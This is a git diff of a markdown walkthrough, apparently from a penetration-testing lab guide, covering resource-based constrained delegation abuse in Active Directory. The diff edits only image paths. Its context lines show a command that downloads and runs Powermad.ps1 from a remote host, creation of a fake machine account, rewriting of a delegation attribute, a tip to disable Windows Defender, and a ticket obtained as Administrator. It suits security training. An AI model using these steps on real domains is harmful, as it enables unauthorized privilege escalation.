@@ -73,7 +73,7 @@ iex (iwr http://192.168.248.2:8090/Powermad.ps1 -usebasicparsing)
 New-MachineAccount -Domain secure.local -Credential $creds -DomainController 10.0.0.100 -MachineAccount FAKE01 -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
 ```
 
-![](<../../../../.gitbook/assets/image (67) (1) (1) (1) (1).png>)
+![](<../../../../.gitbook/assets/image (67) (1) (1) (1) (1) (1).png>)
 
 6\. Get the SID of the computerobject we created:
 
@@ -81,7 +81,7 @@ New-MachineAccount -Domain secure.local -Credential $creds -DomainController 10.
 Get-DomainComputer fake01 -Domain secure.local -Credential $creds -Server 10.0.0.100
 ```
 
-![](<../../../../.gitbook/assets/image (55) (1) (1).png>)
+![](<../../../../.gitbook/assets/image (55) (1) (1) (1).png>)
 
 7\. Now we need to create the raw security descriptor which we then will write to the attribute:
 
@@ -103,7 +103,7 @@ Make sure you changed the SID since it can differ in your lab.
 Get-DomainComputer DATA01 -Domain secure.local -Credential $creds -Server 10.0.0.100 | Set-DomainObject -Domain secure.local -Credential $creds -Server 10.0.0.100 -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Verbose
 ```
 
-![](<../../../../.gitbook/assets/image (66) (1).png>)
+![](<../../../../.gitbook/assets/image (66) (1) (1).png>)
 
 9\. Seems like it worked, now we can check the value of the `msds-AllowedToActOnBehalfOfOtherIdentity` attribute by saving it in a variable and doing some powershell confu to decrypt it:
 
@@ -139,7 +139,7 @@ Temporarily disable Windows Defender if it gets flagged by it.
 
 12\. We got a CIFS ticket as `Administrator` for `data01.secure.local`, now we can try to list the C disk.
 
-![](<../../../../.gitbook/assets/image (61) (1).png>)
+![](<../../../../.gitbook/assets/image (61) (1) (1).png>)
 
 ### Cleanup
 
